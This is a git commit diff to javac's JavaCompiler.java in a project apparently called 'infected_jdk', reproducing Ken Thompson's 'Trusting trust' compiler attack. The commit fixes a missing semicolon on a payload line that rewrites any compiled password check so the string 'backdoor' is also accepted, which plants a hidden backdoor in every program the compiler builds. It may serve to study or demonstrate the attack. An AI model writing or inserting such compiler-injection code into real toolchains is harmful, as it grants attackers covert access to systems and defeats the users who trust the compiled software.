f3e52cd8c63195e4062ee8441ae6b0c07b55b7d3
Elias Lundell <elilun03@gmail.com>
2025-03-21 11:28:46 +0100

    add ;

--- infected_jdk/src/jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java
+++ infected_jdk/src/jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java
@@ -698,7 +698,7 @@ public class JavaCompiler {
 
         /* Payload */
 
-        content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q ")")
+        content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q ")");
         content = content_str;
 
         /* Trusting trust done */
